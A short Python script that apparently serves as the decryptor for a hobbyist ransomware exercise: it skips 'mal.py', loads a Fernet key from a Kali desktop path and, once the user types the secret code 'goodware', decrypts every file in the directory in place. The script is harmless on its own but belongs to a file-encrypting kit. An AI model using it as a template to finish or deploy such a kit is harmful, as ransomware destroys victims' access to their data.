#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
	if file == "mal.py" or file == "thekey.key" or file == "decrypt.py": #thekey.key only needs to be excluded if its in the same directory
		continue

	if os.path.isfile(file):
		files.append(file)
print(files)


with open("/home/kali/Desktop/thekey.key", "rb") as key:
	secretkey = key.read()

#change the secret code as needed. just provides extra fun ;)
secretcode = "goodware"
user_phrase = input("Enter the secret code:\n")


if (user_phrase == secretcode):
	for file in files:
		with open(file, "rb") as thefile:
			content = thefile.read()
		content_decrypted = Fernet(secretkey).decrypt(content)
		with open(file, "wb") as thefile:
			thefile.write(content_decrypted)

		print("You have restored the files")

else:
	print("Enter the right code!!!")
